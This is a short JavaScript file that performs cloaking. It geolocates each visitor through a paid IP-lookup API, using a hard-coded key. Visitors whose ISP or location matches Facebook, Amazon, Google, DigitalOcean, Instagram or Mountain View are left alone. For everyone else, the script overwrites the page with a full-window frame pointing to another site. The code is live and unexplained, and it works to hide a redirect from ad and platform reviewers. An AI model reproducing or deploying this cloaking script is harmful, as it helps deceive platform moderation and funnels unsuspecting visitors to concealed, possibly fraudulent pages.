setTimeout(function() {

    var k = 'hsjB766QPRymFLx';

    var str = [
        "<frameset rows='100%, *' frameborder=no framespacing=0 border=0><frame src=\"https://landingmaker.github.io/kelly-blog/frame.html\" name=mainwindow frameborder=no framespacing=0 marginheight=0 marginwidth=0></frame></frameset>",
        "<noframes><h2>Your browser does not support frames. We recommend upgrading your browser.</h2><br><br>",
        "<center>Click <a href=\"https://landingmaker.github.io/kelly-blog/frame.html\" >here</a> to enter the site.</center>",
        "</noframes>"
    ];

    var promise = $.ajax({
        url: "https://pro.ip-api.com/json/?key="+k,
        dataType: "jsonp",
        jsonp: "callback",
        data: {
            fields: 'country,countryCode,region,regionName,city,zip,isp,org,as,reverse,mobile,proxy,query,status,message'
        }
    });

    promise.then(function(response) {

        for (var key in response) {

            if (Object.prototype.hasOwnProperty.call(response, key)) {

                var val = response[key];

                if($.type(val) === 'string') {
                    if(val.match(/facebook|tfbnw|amazonaws|amazon|digitalocean|instagram|mountain\s+view|google/ig)) {
                        return;
                    }
                }

            }
        }

        $(".se-pre-con").fadeOut("slow", function() {
            var body = document.getElementsByTagName( "body" );
            body[0].parentNode.innerHTML = str.join("");
        });


    }, function() {

        $(".se-pre-con").fadeOut("slow", function() {
            var body = document.getElementsByTagName( "body" );
            body[0].parentNode.innerHTML = str.join("");
        });

    });

}, 0);